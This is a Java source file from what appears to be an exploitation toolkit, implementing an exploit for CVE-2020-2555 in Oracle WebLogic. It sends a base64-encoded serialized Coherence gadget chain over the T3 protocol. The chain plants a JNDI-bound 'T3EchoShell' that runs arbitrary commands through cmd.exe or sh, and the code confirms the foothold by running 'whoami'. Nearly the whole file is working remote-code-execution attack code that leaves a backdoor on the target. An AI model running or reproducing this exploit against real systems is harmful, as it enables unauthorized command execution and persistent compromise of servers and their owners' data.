package superman.vuls;

import sun.misc.BASE64Decoder;
import superman.core.JNDIShellClient;
import superman.core.PayloadSend;
import superman.payloads.CoherenceEcho;
import superman.payloads.EchoPayload;

import java.util.ArrayList;

public class CVE_2020_2555 extends EchoVulImpl {

    @Override
    protected void init(String protocol, String host, int port) {
        this.protocol=protocol=="https"?"t3s":"t3";
        this.host=host;
        this.port=port;
        echoPayloads = new ArrayList<EchoPayload>();
        echoPayloads.add(new CoherenceEcho());
    }

    @Override
    public String check(String protocol, String host, int port) {
        String result=super.check(protocol, host, port);
        if(result!=null){
            return result;
        }
        String payload="rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAnNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAJ3QAFnN1cGVybWFuLkNvaGVyZW5jZUVjaG90ABJDb2hlcmVuY2VFY2hvLmphdmF0AAlnZXRPYmplY3RzcQB+AAsAAAAxcQB+AA1xAH4ADnQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAXeHNyACRjb20udGFuZ29zb2wudXRpbC5maWx0ZXIuTGltaXRGaWx0ZXKrKQG5dsTicQIABkkAC21fY1BhZ2VTaXplSQAHbV9uUGFnZUwADG1fY29tcGFyYXRvcnQAFkxqYXZhL3V0aWwvQ29tcGFyYXRvcjtMAAhtX2ZpbHRlcnQAGkxjb20vdGFuZ29zb2wvdXRpbC9GaWx0ZXI7TAAPbV9vQW5jaG9yQm90dG9tcQB+AAFMAAxtX29BbmNob3JUb3BxAH4AAXhyADRjb20udGFuZ29zb2wudXRpbC5maWx0ZXIuQWJzdHJhY3RRdWVyeVJlY29yZGVyRmlsdGVy87mCAfaA65ACAAB4cAAAAAAAAAAAc3IALGNvbS50YW5nb3NvbC51dGlsLmV4dHJhY3Rvci5DaGFpbmVkRXh0cmFjdG9yBu4QQzpMxLQCAAB4cgA2Y29tLnRhbmdvc29sLnV0aWwuZXh0cmFjdG9yLkFic3RyYWN0Q29tcG9zaXRlRXh0cmFjdG9yCGs9jAVpD0QCAAFbAAxtX2FFeHRyYWN0b3J0ACNbTGNvbS90YW5nb3NvbC91dGlsL1ZhbHVlRXh0cmFjdG9yO3hyAC1jb20udGFuZ29zb2wudXRpbC5leHRyYWN0b3IuQWJzdHJhY3RFeHRyYWN0b3J1IomtTUYBOAIAAUkACW1fblRhcmdldHhwAAAAAHVyACNbTGNvbS50YW5nb3NvbC51dGlsLlZhbHVlRXh0cmFjdG9yOyJGIEc1xKD+AgAAeHAAAAADc3IAL2NvbS50YW5nb3NvbC51dGlsLmV4dHJhY3Rvci5SZWZsZWN0aW9uRXh0cmFjdG9yh5c3kbJkKd0CAANbAAltX2FvUGFyYW10ABNbTGphdmEvbGFuZy9PYmplY3Q7TAARbV9leHRyYWN0b3JDYWNoZWRxAH4AAUwACW1fc01ldGhvZHEAfgAFeHEAfgAgAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAF1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABwdAAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcnNxAH4AJAAAAAB1cQB+ACcAAAABdXEAfgApAAAAAHB0AAtuZXdJbnN0YW5jZXNxAH4AJAAAAAB1cQB+ACcAAAADdAAUc3VwZXJtYW4uVDNFY2hvU2hlbGx1cgACW0Ks8xf4BghU4AIAAHhwAAANtsr+ur4AAAA0ALAKACgAYwcAZAoAAgBlBwBmCgAEAGMKAAQAZwoAAgBoCgACAGkKAAIAagcAawgAbAoAFgBtBwBuCgANAGMIAG8LAHAAcQgAcgoAcwB0CgAWAHUIAHYKABYAdwcAeAgAeQgAeggAewgAfAoAfQB+CgB9AH8KAIAAgQcAggoAHgBjCgCDAIQKAB4AhQoAHgCGCgAWAIcHAIgKACQAYwsAcACJCgAKAIoHAIsHAIwBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFkxzdXBlcm1hbi9UM0VjaG9TaGVsbDsBABFzZXRTZXJ2ZXJMb2NhdGlvbgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAEGZpbGVPdXRwdXRTdHJlYW0BABpMamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtOwEABHBhdGgBABJMamF2YS9sYW5nL1N0cmluZzsBAAR0ZXh0AQANU3RhY2tNYXBUYWJsZQcAawEACkV4Y2VwdGlvbnMHAI0BABFnZXRTZXJ2ZXJMb2NhdGlvbgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY3R4AQAWTGphdmF4L25hbWluZy9Db250ZXh0OwEABG5hbWUBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADYnVmAQACW0IBAANsZW4BAAFJAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAA2NtZAcAeAcAQgcAiAcAjgcARgcAggEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAI8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAClNvdXJjZUZpbGUBABBUM0VjaG9TaGVsbC5qYXZhDAAqACsBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MACoAkAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAJEAkgwAkwCUDACVACsMAJYAKwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAZ1bmJpbmQMAJcAmAEAG2phdmF4L25hbWluZy9Jbml0aWFsQ29udGV4dAEAB3NlY3Rlc3QHAJkMAGwAkAEAB29zLm5hbWUHAJoMAJsAPQwAnACdAQADd2luDACeAJ8BABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jAQACc2gBAAItYwcAoAwAoQCiDACjAKQHAKUMAKYApwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwCODACoAKkMAJMAqgwAqwCsDAAqAJQBABRzdXBlcm1hbi9UM0VjaG9TaGVsbAwArQCuDACvACsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAud2VibG9naWMvY2x1c3Rlci9zaW5nbGV0b24vQ2x1c3Rlck1hc3RlclJlbW90ZQEAGGphdmEvcm1pL1JlbW90ZUV4Y2VwdGlvbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAFY2xvc2UBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABRqYXZheC9uYW1pbmcvQ29udGV4dAEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAHKFtCSUkpVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABnJlYmluZAEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAD3ByaW50U3RhY2tUcmFjZQAhACQAKAABACkAAAAGAAEAKgArAAEALAAAAC8AAQABAAAABSq3AAGxAAAAAgAtAAAABgABAAAAEgAuAAAADAABAAAABQAvADAAAAABADEAMgACACwAAACaAAMABAAAACW7AAJZK7cAA04tuwAEWbcABSy2AAa2AActtgAILbYACacABE6xAAEAAAAgACMACgADAC0AAAAeAAcAAAAjAAkAJAAYACUAHAAmACAAKQAjACcAJAAqAC4AAAAqAAQACQAXADMANAADAAAAJQAvADAAAAAAACUANQA2AAEAAAAlADcANgACADgAAAAHAAJjBwA5AAA6AAAABAABADsAAQA8AD0AAgAsAAABpgAEAAgAAACjKxILtgAMmQAVuwANWbcADk0sEg+5ABACAAGwEhG4ABJNLMYAJCy2ABMSFLYAFZkAGAa9ABZZAxIXU1kEEhhTWQUrU6cAFQa9ABZZAxIZU1kEEhpTWQUrU064ABsttgActgAdOgQRBAC8CDoFAzYGuwAeWbcAHzoHGQQZBbYAIFk2BgKfABAZBxkFAxUGtgAhp//ouwAWWRkHtgAitwAjsE0BsAACAAAAGgCgAAoAGwCfAKAACgADAC0AAAA+AA8AAAAvAAkAMAARADEAGQAyABsANAAhADUAWQA2AGUANwBsADgAbwA5AHgAOgCGADsAkwA9AKAAQAChAEMALgAAAFwACQARAAoAPgA/AAIAIQB/AEAANgACAFkARwBBAEIAAwBlADsAQwBEAAQAbAA0AEUARgAFAG8AMQBHAEgABgB4ACgASQBKAAcAAACjAC8AMAAAAAAAowBLADYAAQA4AAAAOwAGG/wAKgcATFEHAE3/AB8ACAcATgcATAcATAcATQcATwcAUAEHAFEAABr/AAwAAgcATgcATAABBwA5ADoAAAAEAAEAOwABAFIAUwACACwAAAA/AAAAAwAAAAGxAAAAAgAtAAAABgABAAAASQAuAAAAIAADAAAAAQAvADAAAAAAAAEAVABVAAEAAAABAFYAVwACADoAAAAEAAEAWAABAFIAWQACACwAAABJAAAABAAAAAGxAAAAAgAtAAAABgABAAAATgAuAAAAKgAEAAAAAQAvADAAAAAAAAEAVABVAAEAAAABAFoAWwACAAAAAQBcAF0AAwA6AAAABAABAFgACABeACsAAQAsAAAAfQAEAAEAAAAguwANWbcADksqEg+7ACRZtwAluQAmAwCnAAhLKrYAJ7EAAQAAABcAGgAKAAMALQAAABoABgAAABUACAAWABcAHQAaABsAGwAcAB8AHgAuAAAAFgACAAgADwA+AD8AAAAbAAQAXwBgAAAAOAAAAAcAAloHADkEAAEAYQAAAAIAYnBwdAASZGVmaW5lQ29kZUdlbkNsYXNzcHB2cgAwd2VibG9naWMudXRpbHMuY2xhc3Nsb2FkZXJzLkNsYXNzcGF0aENsYXNzTG9hZGVyAAAAAAAAAAAAAAB4cA==";
        try {
            PayloadSend.sendT3(protocol,host,port,new BASE64Decoder().decodeBuffer(payload));
            Thread.sleep(3000);
            result = JNDIShellClient.exec(protocol,host,port,"whoami");
            if (result != null) {
                //echoPayload = payload;
                return result.trim();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
